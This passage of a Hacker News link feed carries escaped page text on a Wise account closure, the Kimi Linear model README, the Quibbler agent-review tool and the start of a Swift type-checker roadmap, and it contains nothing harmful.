          &lt;p&gt;(03) 5550 xxxx and (03) 7010 xxxx&lt;/p&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;North East (covering QLD)&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;p&gt;(07) 5550 xxxx and (07) 7010 xxxx&lt;/p&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;p&gt;Central West (covering SA, WA and NT)&lt;/p&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;p&gt;(08) 5550 xxxx and (08) 7010 xxxx&lt;/p&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h2"&gt;Mobile numbers&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;0491 570 006&lt;/item&gt;
      &lt;item&gt;0491 570 156&lt;/item&gt;
      &lt;item&gt;0491 570 157&lt;/item&gt;
      &lt;item&gt;0491 570 158&lt;/item&gt;
      &lt;item&gt;0491 570 159&lt;/item&gt;
      &lt;item&gt;0491 570 110&lt;/item&gt;
      &lt;item&gt;0491 570 313&lt;/item&gt;
      &lt;item&gt;0491 570 737&lt;/item&gt;
      &lt;item&gt;0491 571 266&lt;/item&gt;
      &lt;item&gt;0491 571 491&lt;/item&gt;
      &lt;item&gt;0491 571 804&lt;/item&gt;
      &lt;item&gt;0491 572 549&lt;/item&gt;
      &lt;item&gt;0491 572 665&lt;/item&gt;
      &lt;item&gt;0491 572 983&lt;/item&gt;
      &lt;item&gt;0491 573 770&lt;/item&gt;
      &lt;item&gt;0491 573 087&lt;/item&gt;
      &lt;item&gt;0491 574 118&lt;/item&gt;
      &lt;item&gt;0491 574 632&lt;/item&gt;
      &lt;item&gt;0491 575 254&lt;/item&gt;
      &lt;item&gt;0491 575 789&lt;/item&gt;
      &lt;item&gt;0491 576 398&lt;/item&gt;
      &lt;item&gt;0491 576 801&lt;/item&gt;
      &lt;item&gt;0491 577 426&lt;/item&gt;
      &lt;item&gt;0491 577 644&lt;/item&gt;
      &lt;item&gt;0491 578 957&lt;/item&gt;
      &lt;item&gt;0491 578 148&lt;/item&gt;
      &lt;item&gt;0491 578 888&lt;/item&gt;
      &lt;item&gt;0491 579 212&lt;/item&gt;
      &lt;item&gt;0491 579 760&lt;/item&gt;
      &lt;item&gt;0491 579 455&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Freephone and local rate numbers&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;1800 160 401&lt;/item&gt;
      &lt;item&gt;1800 975 707&lt;/item&gt;
      &lt;item&gt;1800 975 708&lt;/item&gt;
      &lt;item&gt;1800 975 709&lt;/item&gt;
      &lt;item&gt;1800 975 710&lt;/item&gt;
      &lt;item&gt;1800 975 711&lt;/item&gt;
      &lt;item&gt;1300 975 707&lt;/item&gt;
      &lt;item&gt;1300 975 708&lt;/item&gt;
      &lt;item&gt;1300 975 709&lt;/item&gt;
      &lt;item&gt;1300 975 710&lt;/item&gt;
      &lt;item&gt;1300 975 711&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45765787</guid><pubDate>Thu, 30 Oct 2025 21:49:11 +0000</pubDate></item><item><title>A change of address led to our Wise accounts being shut down</title><link>https://shaun.nz/why-were-never-using-wise-again-a-cautionary-tale-from-a-business-burned/</link><description>&lt;doc fingerprint="72c0a9533044ffc4"&gt;
  &lt;main&gt;
    &lt;p&gt;For years, one of my businesses has been a regular user of Wise (formerly TransferWise). Wise is a financial service that lets you send and receive money across currencies, often at a better rate and lower fee than traditional banks. Sounds great, right?&lt;/p&gt;
    &lt;p&gt;Until it isn’t.&lt;/p&gt;
    &lt;p&gt;This is our story – a sobering, frustrating, and frankly appalling experience that ended with our business and personal accounts being shut down, without any meaningful reason, support, or recourse.&lt;/p&gt;
    &lt;p&gt;And all we did? We updated our address.&lt;/p&gt;
    &lt;head rend="h2"&gt;🏢 A Routine Change Turned Nightmare&lt;/head&gt;
    &lt;p&gt;Like many businesses, we recently moved into a new office. Alongside the usual updates to suppliers and records, we updated our physical address with Wise. Not long after, we received an email requesting us to verify the new address.&lt;/p&gt;
    &lt;p&gt;Fair enough – we had no problem with that.&lt;/p&gt;
    &lt;p&gt;Wise provided a dropdown list of acceptable documents: a lease agreement, rates notice, tax document, utilities bill, or telecommunications bill. Due to our company structure, most of those documents are in the name of our parent company or show our PO Box (which NZ Post requires, since they won’t deliver to our street address). But we had a telecommunications bill that ticked every box:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Correct entity name ✅&lt;/item&gt;
      &lt;item&gt;Correct physical street address ✅&lt;/item&gt;
      &lt;item&gt;Even detailed our fibre connection at the new premises ✅&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;So we uploaded it – and assumed that would be the end of it.&lt;/p&gt;
    &lt;p&gt;We were so wrong.&lt;/p&gt;
    &lt;head rend="h2"&gt;📞 The Call That Made No Sense&lt;/head&gt;
    &lt;p&gt;Days later, we received an email: our document was rejected.&lt;/p&gt;
    &lt;p&gt;No clear reason. So, I called Wise and explained the situation to the customer service representative.&lt;/p&gt;
    &lt;p&gt;Her response left me stunned.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“The document was rejected because it was a tax invoice, not a bill.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Wait… what?&lt;/p&gt;
    &lt;p&gt;I paused, trying to process this. I politely explained that in New Zealand, a “tax invoice” is a legal form of a bill – even down to the name “tax invoice” being a legal requirement by IRD, and that’s how telecommunications companies issue invoices here. But she refused to accept it.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“It needs to say Telecommunications Bill at the top,” she insisted.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;quote&gt;
      &lt;p&gt;“A tax invoice isn’t acceptable.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;This is simply not true, and completely out of touch with New Zealand’s business documentation standards. The rep wouldn’t budge.&lt;/p&gt;
    &lt;head rend="h2"&gt;🧠 The “Solution” That Was Beyond Belief&lt;/head&gt;
    &lt;p&gt;Still trying to find a solution, I asked: what do you recommend I do then?&lt;/p&gt;
    &lt;p&gt;Her answer?&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“You should find a local shared workspace, lease a desk under your company name, change your registered office to that address, and use that lease document to verify your address with us.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Yes, you read that right.&lt;/p&gt;
    &lt;p&gt;Wise’s advice was to artificially lease a desk we didn’t need, change our registered address, and use that document – just to verify an address we actually operate from.&lt;/p&gt;
    &lt;p&gt;I asked to speak to a manager. That request was refused. She told me, flatly:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“I am providing you with the correct information.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;A bit more back and forth… then the call was disconnected.&lt;/p&gt;
    &lt;head rend="h2"&gt;📞 A Glimmer of Hope – Then The Hammer Falls&lt;/head&gt;
    &lt;p&gt;Later that day, I received a call back from Wise – not from a manager (because apparently, Wise doesn’t have managers), but from a more “senior” representative.&lt;/p&gt;
    &lt;p&gt;This rep was more empathetic and agreed the document should have been acceptable. She escalated the issue, resubmitted the document herself, and said she’d personally follow up if it was rejected again.&lt;/p&gt;
    &lt;p&gt;Progress, I thought.&lt;/p&gt;
    &lt;p&gt;Until the next morning.&lt;/p&gt;
    &lt;head rend="h2"&gt;🚫 “We’ve Restricted Your Account”&lt;/head&gt;
    &lt;p&gt;I woke to an email with a stunning subject line:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“We’ve restricted your account”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Just like that, our entire business account was locked. No warning. No reason. No discussion.&lt;/p&gt;
    &lt;p&gt;We could no longer send or receive money, use our Wise cards, or even contact support. The email stated:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“Due to our current risk policies, your account will be closed in a few months. You will not be able to use support channels.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Even worse? My personal Wise account was locked too. The same personal account which did have its address fully verified, by a rates invoice for my personal address.&lt;/p&gt;
    &lt;p&gt;Both had funds inside.&lt;/p&gt;
    &lt;head rend="h2"&gt;🧾 An “Appeal” That Wasn’t an Appeal&lt;/head&gt;
    &lt;p&gt;The email offered an option to appeal. Naturally, I did.&lt;/p&gt;
    &lt;p&gt;The appeal process asked for our articles of incorporation and share registry. No problem.&lt;/p&gt;
    &lt;p&gt;Then it asked us to provide our preferred currency, and bank account details to refund the balances.&lt;/p&gt;
    &lt;p&gt;Wait… I thought this was an appeal? A chance to discuss and resolve the issue?&lt;/p&gt;
    &lt;p&gt;Nope.&lt;/p&gt;
    &lt;p&gt;That was the end. There was no opportunity to explain anything, no communication, no questions asked. The decision was made, and we were locked out, permanently.&lt;/p&gt;
    &lt;head rend="h2"&gt;🔁 Let’s Recap&lt;/head&gt;
    &lt;p&gt;To summarise the absurdity of this:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;We moved office, and updated our address with Wise&lt;/item&gt;
      &lt;item&gt;We provided a legal, NZ-compliant telecommunications bill showing our entity and address&lt;/item&gt;
      &lt;item&gt;It was rejected because it was labelled a “Tax Invoice”&lt;/item&gt;
      &lt;item&gt;A rep told us to lease a coworking desk elsewhere just to get a different document&lt;/item&gt;
      &lt;item&gt;A senior rep agreed we were right, and escalated it&lt;/item&gt;
      &lt;item&gt;Then our accounts were shut down – with no explanation or recourse&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Even trying to call support now gets an automated message: “Because your account is restricted, we cannot connect you.”&lt;/p&gt;
    &lt;head rend="h2"&gt;⚠️ Our Final Word: Be Very, Very Careful&lt;/head&gt;
    &lt;p&gt;We had used Wise for years. Regular monthly supplier payments. International stock orders. Five-figure transactions. Never a problem – until this. A minor change triggered a totally flawed process that completely shut us out, with no transparency or logical path to resolution.&lt;/p&gt;
    &lt;p&gt;We’re not alone – a quick search shows many others facing similar horror stories with Wise.&lt;/p&gt;
    &lt;p&gt;So this is my word of warning:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;💡 Don’t put all your eggs in the Wise basket.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;If you’re a business, don’t rely on them as your sole means of transferring funds. For us, it’s back to traditional banks – slower, yes, but at least they have humans you can talk to, and actual escalation paths.&lt;/p&gt;
    &lt;head rend="h2"&gt;🧾 28th October update on our Wise debacle – it gets worse.&lt;/head&gt;
    &lt;p&gt;Following the so-called “appeal” (which gave us no option to provide any information), we received the unsurprising outcome: Wise has decided to keep our accounts closed as we had breached their acceptable use policy. 🤨&lt;/p&gt;
    &lt;p&gt;What was surprising, however, was the reason they gave after I queried what was breached in Wise’s Acceptable Use Policy:&lt;/p&gt;
    &lt;p&gt;I was told my personal account was being closed for allegedly breaching their Acceptable Use Policy — specifically, section 1.4.e, which states “you may not use your personal Wise account to receive business payments.”&lt;/p&gt;
    &lt;p&gt;That’s… news to me.&lt;/p&gt;
    &lt;p&gt;I’ve never used my personal account for business transactions — in fact, over 99% of transfers were to overseas family members. When I asked for clarification or examples, I got none. Just a vague statement and the very strange line:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“Just because we can’t offer you our services going forward doesn’t mean that we think your business activities are illegal or illegitimate — it just means that we don’t support those types of activities.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;What activities?! Again, no explanation provided.&lt;/p&gt;
    &lt;p&gt;To make matters worse — our business account’s refund transfer failed. Why? Because it requires documentation — the same documentation Wise previously rejected for address verification, claiming a telecommunications tax invoice isn’t a bill.&lt;/p&gt;
    &lt;p&gt;After a few days, the transfer was then cancelled as of course, Wise was unable to “verify” us.&lt;/p&gt;
    &lt;p&gt;So now our funds are in limbo, their support ticket is marked “final response,” and our attempts to get clarity have gone nowhere. We’ve escalated the issue to Financial Services Complaints Ltd, Wise’s dispute resolution provider in New Zealand.&lt;/p&gt;
    &lt;p&gt;🎯 TL;DR: Nothing resolved.&lt;/p&gt;
    &lt;p&gt;Funds stuck. No clear reason. No accountability. Wise still gets a 0/10 from us.&lt;/p&gt;
    &lt;p&gt;This isn’t just poor service — it’s unacceptable.&lt;/p&gt;
    &lt;p&gt;Think twice before trusting Wise with your money.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45766253</guid><pubDate>Thu, 30 Oct 2025 22:41:50 +0000</pubDate></item><item><title>Kimi Linear: An Expressive, Efficient Attention Architecture</title><link>https://github.com/MoonshotAI/Kimi-Linear</link><description>&lt;doc fingerprint="b7db115e8c4b8fd0"&gt;
  &lt;main&gt;
    &lt;p&gt;(a) On MMLU-Pro (4k context length), Kimi Linear achieves 51.0 performance with similar speed as full attention. On RULER (128k context length), it shows Pareto-optimal performance (84.3) and a 3.98x speedup. (b) Kimi Linear achieves 6.3x faster TPOT compared to MLA, offering significant speedups at long sequence lengths (1M tokens).&lt;/p&gt;
    &lt;p&gt;Kimi Linear is a hybrid linear attention architecture that outperforms traditional full attention methods across various contexts, including short, long, and reinforcement learning (RL) scaling regimes. At it's core is Kimi Delta Attention (KDA)—a refined version of Gated DeltaNet that introduces a more efficient gating mechanism to optimize the use of finite-state RNN memory.&lt;/p&gt;
    &lt;p&gt;Kimi Linear achieves superior performance and hardware efficiency, especially for long-context tasks. It reduces the need for large KV caches by up to 75% and boosts decoding throughput by up to &lt;/p&gt;
    &lt;p&gt;We open-sourced the KDA kernel in FLA, and released two versions model checkpoints trained with 5.7T tokens.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="5"&gt;
        &lt;cell role="head"&gt;Model&lt;/cell&gt;
        &lt;cell role="head"&gt;#Total Params&lt;/cell&gt;
        &lt;cell role="head"&gt;#Activated Params&lt;/cell&gt;
        &lt;cell role="head"&gt;Context Length&lt;/cell&gt;
        &lt;cell role="head"&gt;Download Link&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Kimi-Linear-Base&lt;/cell&gt;
        &lt;cell&gt;48B&lt;/cell&gt;
        &lt;cell&gt;3B&lt;/cell&gt;
        &lt;cell&gt;1M&lt;/cell&gt;
        &lt;cell&gt;🤗 Hugging Face&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Kimi-Linear-Instruct&lt;/cell&gt;
        &lt;cell&gt;48B&lt;/cell&gt;
        &lt;cell&gt;3B&lt;/cell&gt;
        &lt;cell&gt;1M&lt;/cell&gt;
        &lt;cell&gt;🤗 Hugging Face&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Kimi Delta Attention (KDA): A linear attention mechanism that refines the gated delta rule with finegrained gating.&lt;/item&gt;
      &lt;item&gt;Hybrid Architecture: A 3:1 KDA-to-global MLA ratio reduces memory usage while maintaining or surpassing the quality of full attention.&lt;/item&gt;
      &lt;item&gt;Superior Performance: Outperforms full attention in a variety of tasks, including long-context and RL-style benchmarks on 1.4T token training runs with fair comparisons.&lt;/item&gt;
      &lt;item&gt; High Throughput: Achieves up to &lt;math-renderer&gt;$6\times$&lt;/math-renderer&gt;faster decoding and significantly reduces time per output token (TPOT).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;To use the Kimi Linear model, we recommend the following:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Language: &lt;code&gt;python&lt;/code&gt;&amp;gt;= 3.10&lt;/item&gt;
      &lt;item&gt;Package: &lt;code&gt;torch&lt;/code&gt;&amp;gt;= 2.6&lt;/item&gt;
      &lt;item&gt;Package: &lt;code&gt;fla-core&lt;/code&gt;&amp;gt;= 0.4.0&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;pip install -U fla-core&lt;/code&gt;
    &lt;p&gt;Example Code:&lt;/p&gt;
    &lt;code&gt;from transformers import AutoModelForCausalLM, AutoTokenizer

model_name = "moonshotai/Kimi-Linear-48B-A3B-Instruct"
model = AutoModelForCausalLM.from_pretrained(
    model_name,
    torch_dtype="auto",
    device_map="auto",
    trust_remote_code=True
)
tokenizer = AutoTokenizer.from_pretrained(model_name, trust_remote_code=True)

messages = [
    {"role": "system", "content": "You are a helpful assistant provided by Moonshot-AI."},
    {"role": "user", "content": "Is 123 a prime?"}
]
input_ids = tokenizer.apply_chat_template(
    messages, 
    add_generation_prompt=True, 
    return_tensors="pt"
).to(model.device)
generated_ids = model.generate(inputs=input_ids, max_new_tokens=500)
response = tokenizer.batch_decode(generated_ids)[0]
print(response)&lt;/code&gt;
    &lt;p&gt;For deployment, you can use the latest vllm to create an OpenAI-compatible API endpoint.&lt;/p&gt;
    &lt;code&gt;vllm serve moonshotai/Kimi-Linear-48B-A3B-Instruct \
  --port 8000 \
  --tensor-parallel-size 4 \
  --max-model-len 1048576 \
  --trust-remote-code&lt;/code&gt;
    &lt;p&gt;If you found our work useful, please cite&lt;/p&gt;
    &lt;code&gt;@article{kimi2025kda,
  title  = {Kimi Linear: An Expressive, Efficient Attention Architecture},
  author = {kimi Team},
  year   = {2025},
  url    = {https://github.com/MoonshotAI/Kimi-Linear/blob/master/tech_report.pdf}
}&lt;/code&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45766937</guid><pubDate>Fri, 31 Oct 2025 00:07:36 +0000</pubDate></item><item><title>Show HN: Quibbler – A critic for your coding agent that learns what you want</title><link>https://github.com/fulcrumresearch/quibbler</link><description>&lt;doc fingerprint="2c94ad61798f9efa"&gt;
  &lt;main&gt;
    &lt;p&gt;Quibbler is a critic for your coding agent. It runs in the background and critiques your coding agent's actions, either via hooks or an MCP. When your coding agent is once again failing in the same ways, or ignoring your spec, instead of having to prompt it, the Quibbler agent will automatically observe and correct it.&lt;/p&gt;
    &lt;p&gt;It will also learn rules from your usage, and then enforce them so you don't have to.&lt;/p&gt;
    &lt;head class="px-3 py-2"&gt;demo.mp4&lt;/head&gt;
    &lt;p&gt;We've found Quibbler useful in automatically preventing agents from:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Fabricating results without running commands&lt;/item&gt;
      &lt;item&gt;Not running tests or skipping verification steps&lt;/item&gt;
      &lt;item&gt;Not following your coding style and patterns&lt;/item&gt;
      &lt;item&gt;Hallucinating numbers, metrics, or functionality&lt;/item&gt;
      &lt;item&gt;Creating new patterns instead of following existing ones&lt;/item&gt;
      &lt;item&gt;Making changes that don't align with user intent&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Quibbler maintains context across reviews, learning your project's patterns and rules over time.&lt;/p&gt;
    &lt;p&gt;Using uv:&lt;/p&gt;
    &lt;code&gt;uv tool install quibbler&lt;/code&gt;
    &lt;p&gt;Using pip:&lt;/p&gt;
    &lt;code&gt;pip install quibbler&lt;/code&gt;
    &lt;p&gt;Quibbler supports two integration modes:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Uses Claude Code's hook system for event-driven monitoring&lt;/item&gt;
      &lt;item&gt;Passively observes all agent actions (tool use, prompts, etc.)&lt;/item&gt;
      &lt;item&gt;Fire-and-forget feedback injection via file writes&lt;/item&gt;
      &lt;item&gt;More powerful affordances but Claude Code-specific&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Uses the Model Context Protocol for universal compatibility&lt;/item&gt;
      &lt;item&gt;Agent calls &lt;code&gt;review_code&lt;/code&gt;tool after making changes&lt;/item&gt;
      &lt;item&gt;Synchronous review with immediate feedback&lt;/item&gt;
      &lt;item&gt;Simple setup via MCP server configuration&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Choose your mode and follow the appropriate setup instructions:&lt;/p&gt;
    &lt;p&gt;Add Quibbler to your agent's MCP server configuration.&lt;/p&gt;
    &lt;p&gt;For Cursor (&lt;code&gt;.cursor/mcp.json&lt;/code&gt;):&lt;/p&gt;
    &lt;code&gt;{
  "mcpServers": {
    "quibbler": {
      "command": "quibbler mcp",
      "env": {
        "ANTHROPIC_API_KEY": "your-api-key-here"
      }
    }
  }
}&lt;/code&gt;
    &lt;p&gt;For other MCP-compatible agents: Refer to your agent's documentation for MCP server configuration.&lt;/p&gt;
    &lt;p&gt;Create or update &lt;code&gt;AGENTS.md&lt;/code&gt; in your project root to instruct your agent to use Quibbler:&lt;/p&gt;
    &lt;code&gt;## Code Review Process

After making code changes, you MUST call the `review_code` tool from the Quibbler MCP server with:

- `user_instructions`: The exact instructions the user gave you
- `agent_plan`: **A summary of the specific changes you made** (include which files were modified, what was added/changed, and key implementation details)
- `project_path`: The absolute path to this project

Review Quibbler's feedback and address any issues or concerns raised.

### Example

User asks: "Add logging to the API endpoints"

After implementing, call:

review_code(
user_instructions="Add logging to the API endpoints",
agent_plan="""Changes made:

1. Added logger configuration in config/logging.py
2. Updated routes/api.py to log incoming requests and responses
3. Added request_id middleware for tracing
4. Created logs/ directory with .gitignore""",
   project_path="/absolute/path/to/project"
   )&lt;/code&gt;
    &lt;p&gt;In a terminal, start the Quibbler hook server:&lt;/p&gt;
    &lt;code&gt;export ANTHROPIC_API_KEY="your-api-key-here"
quibbler hook server
# Or specify a custom port:
quibbler hook server 8081&lt;/code&gt;
    &lt;p&gt;Keep this server running in the background. It will receive hook events from Claude Code.&lt;/p&gt;
    &lt;p&gt;In your project directory, run:&lt;/p&gt;
    &lt;code&gt;quibbler hook add&lt;/code&gt;
    &lt;p&gt;This creates or updates &lt;code&gt;.claude/settings.json&lt;/code&gt; with the necessary hooks to forward events to the Quibbler server.&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;.claude/settings.json&lt;/code&gt; should now contain hooks that:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Forward tool use events to Quibbler (&lt;code&gt;quibbler hook forward&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Display Quibbler feedback to the agent (&lt;code&gt;quibbler hook notify&lt;/code&gt;)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;When Claude Code runs in this project, Quibbler will automatically observe and intervene when needed.&lt;/p&gt;
    &lt;p&gt;By default, Quibbler uses Claude Haiku 4.5 for speed. You can change this by creating or editing:&lt;/p&gt;
    &lt;p&gt;Global config (&lt;code&gt;~/.quibbler/config.json&lt;/code&gt;):&lt;/p&gt;
    &lt;code&gt;{
  "model": "claude-sonnet-4-5"
}&lt;/code&gt;
    &lt;p&gt;Project-specific config (&lt;code&gt;.quibbler/config.json&lt;/code&gt; in your project):&lt;/p&gt;
    &lt;code&gt;{
  "model": "claude-sonnet-4-5"
}&lt;/code&gt;
    &lt;p&gt;Project-specific config takes precedence over global config.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Your agent makes code changes, then calls the &lt;code&gt;review_code&lt;/code&gt;tool with user instructions and a summary of changes made&lt;/item&gt;
      &lt;item&gt;Quibbler maintains a persistent review agent per project that: &lt;list rend="ul"&gt;&lt;item&gt;Reviews the completed changes against user intent&lt;/item&gt;&lt;item&gt;Uses Read tool to examine the actual changed files and existing patterns in your codebase&lt;/item&gt;&lt;item&gt;Validates claims and checks for hallucinations&lt;/item&gt;&lt;item&gt;Verifies proper testing and verification steps were included&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Quibbler returns feedback or approval synchronously&lt;/item&gt;
      &lt;item&gt;Your agent addresses any issues found in the review&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Claude Code triggers hooks on events (tool use, prompt submission, etc.)&lt;/item&gt;
      &lt;item&gt;Hook events are forwarded to the Quibbler HTTP server&lt;/item&gt;
      &lt;item&gt;Quibbler maintains a persistent observer agent per session that: &lt;list rend="ul"&gt;&lt;item&gt;Passively watches all agent actions&lt;/item&gt;&lt;item&gt;Builds understanding of what the agent is doing&lt;/item&gt;&lt;item&gt;Intervenes when necessary by writing feedback to &lt;code&gt;.quibbler/{session_id}.txt&lt;/code&gt;&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Feedback is automatically displayed to the agent via the notify hook&lt;/item&gt;
      &lt;item&gt;The agent sees the feedback and can adjust its behavior&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Both modes build understanding over time, learning your project's patterns and saving rules to &lt;code&gt;.quibbler/rules.md&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;You can customize Quibbler's system prompt by editing &lt;code&gt;~/.quibbler/prompt.md&lt;/code&gt;. The default prompt will be created on first run.&lt;/p&gt;
    &lt;p&gt;Project-specific rules in &lt;code&gt;.quibbler/rules.md&lt;/code&gt; are automatically loaded and added to the prompt.&lt;/p&gt;
    &lt;p&gt;Note for Hook Mode: Quibbler writes feedback to a message file that is intended for the agent to read and act on (though users have oversight and can see it). Your agent's system prompt should include a &lt;code&gt;{message_file}&lt;/code&gt; placeholder to tell Quibbler where to write its feedback. For example:&lt;/p&gt;
    &lt;code&gt;When you need to provide feedback to the agent, write it to {message_file}. This is agent-to-agent communication intended for the coding agent to read and act on.&lt;/code&gt;
    &lt;p&gt;If you notice an issue or bug, please open an issue. We welcome contributions - feel free to open a PR.&lt;/p&gt;
    &lt;p&gt;Join our community on Discord to discuss workflows and share experiences.&lt;/p&gt;
    &lt;p&gt;See LICENSE for details.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45767162</guid><pubDate>Fri, 31 Oct 2025 00:43:57 +0000</pubDate></item><item><title>Roadmap for Improving the Type Checker</title><link>https://forums.swift.org/t/roadmap-for-improving-the-type-checker/82952</link><description>&lt;doc fingerprint="97a8d1dba2a69fd6"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;head rend="h1"&gt;Roadmap for improving the type checker&lt;/head&gt;
      &lt;p&gt;In the past, we've released various "manifestos" and "roadmaps" to discuss planned improvements to the language. This post is also a roadmap of sorts, but instead, the focus is on the implementation rather than user-visible language changes (however, I will briefly mention a few potential language changes at the very end).&lt;/p&gt;
      &lt;p&gt;Specifically, I'm going to talk about some work we are doing to improve expression type checking in the Swift compiler. This includes changes that have already shipped in Swift 6.2, changes that are on the &lt;code&gt;main&lt;/code&gt; development branch, changes that we plan on working on next, and more tentative longer-term plans.&lt;/p&gt;
      &lt;p&gt;Before talking about specific improvements, I'm going to start with a rather long explanation of this part of the compiler implementation, which to my knowledge has not been summarized in one place yet.&lt;/p&gt;
      &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
      &lt;p&gt;This is all, of course, about the dreaded &lt;code&gt;the compiler is unable to type-check this expression in reasonable time&lt;/code&gt; error. This error can appear with both valid and invalid code, and the various workarounds are unsatisfactory, to say the least. Splitting up an expression into smaller pieces, introducing type annotations, or attempting other refactorings will sometimes allow valid code to type check, or in the invalid case, surface an actionable diagnostic. However, this breaks flow and becomes a frustrating process of trial and error "shotgun debugging" even for the most experienced Swift programmers. The compiler doesn't even tell you if your expression is valid or not!&lt;/p&gt;
      &lt;head rend="h3"&gt;Type-based overloading&lt;/head&gt;
      &lt;p&gt;Swift supports overloading, where multiple declarations in the same scope can share the same name. Swift allows two forms of overloading: by argument labels, or by type. The former case is ultimately handled by name lookup, because argument labels are specified at the call site. Argument label lookup does not introduce any algorithmic complexity in the type checker, so I won't discuss it further. Type-based overloading, on the other hand, requires the type checker to reason about the types of expressions before it can decide the correct overload to pick, which is a more difficult problem. So in the rest of this post, when I talk about overloading, I'm specifically referring to overloading based on types---either parameter or result types.&lt;/p&gt;
      &lt;head rend="h3"&gt;Constraint solving&lt;/head&gt;
      &lt;p&gt;The Swift compiler implements overload resolution by transforming expression type checking into a constraint solving problem. The compiler always looks at a single expression at a time (with some exceptions, such as multi-statement closures), and proceeds to type-check each expression in turn.&lt;/p&gt;
      &lt;p&gt;First, we introduce type variables to represent the unknown type of each sub-expression in the syntax tree. Next, we generate constraints to describe relationships among type variables. Examples of constraints include "type &lt;code&gt;X&lt;/code&gt; is a subtype of type &lt;code&gt;Y&lt;/code&gt;", "type &lt;code&gt;X&lt;/code&gt; is the result of calling function type &lt;code&gt;Y&lt;/code&gt; with arguments &lt;code&gt;Z&lt;/code&gt;", and crucially for overload resolution, what are called disjunction constraints. A disjunction constraint has the form "type &lt;code&gt;X&lt;/code&gt; is either &lt;code&gt;Y1&lt;/code&gt;, or &lt;code&gt;Y2&lt;/code&gt;, or &lt;code&gt;Y3&lt;/code&gt;, ... or &lt;code&gt;Yn&lt;/code&gt;", where each &lt;code&gt;Yn&lt;/code&gt; is the type of an overloaded declaration with the same name.&lt;/p&gt;
      &lt;p&gt;Once we have our type variables and constraints, we proceed to solve the constraint system by attempting to assign a concrete type to each type variable, in a manner that is consistent with the set of constraints. A set of such assignments is called a solution. The constraint solving process can produce zero, one, or many solutions. If no solution was found, the expression is erroneous. If one solution was found, we're done; if multiple solutions were found, we first attempt to rank the solutions in case one of them is clearly "better" than the others. If this ranking fails to produce a winner, we diagnose an ambiguity error.&lt;/p&gt;
      &lt;head rend="h3"&gt;Algorithmic complexity&lt;/head&gt;
